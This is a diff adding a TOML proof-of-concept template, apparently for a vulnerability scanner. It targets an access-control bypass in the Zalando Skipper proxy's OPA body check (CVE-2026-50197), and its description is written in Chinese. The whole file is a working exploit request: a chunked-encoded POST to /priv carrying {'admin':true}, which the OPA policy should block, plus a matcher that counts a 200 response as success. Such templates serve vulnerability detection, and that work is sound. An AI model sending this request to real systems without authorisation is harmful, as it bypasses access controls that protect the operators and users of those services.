@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = '向Skipper代理的/priv端点发送携带Transfer-Encoding: chunked编码的HTTP POST请求，请求体为被OPA策略禁止的JSON数据{"admin":true}。由于ExtractHttpBodyOptionally函数在处理ContentLength=-1时对chunked编码的请求体提取为空，导致OPA无法正确读取请求体并误判为允许，返回200而非403，从而绕过访问控制策略。'
+id = "POC-AVE-2026-0344"
+name = "Zalando Skipper OPA请求体检查绕过漏洞 PoC"
+severity = "high"
+tags = ["ave-2026-0344"]
+vuln_id = [
+    "CVE-2026-50197",
+    "AVE-2026-0344",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/priv"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+e\r
+{"admin":true}\r
+0\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+Transfer-Encoding = "chunked"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
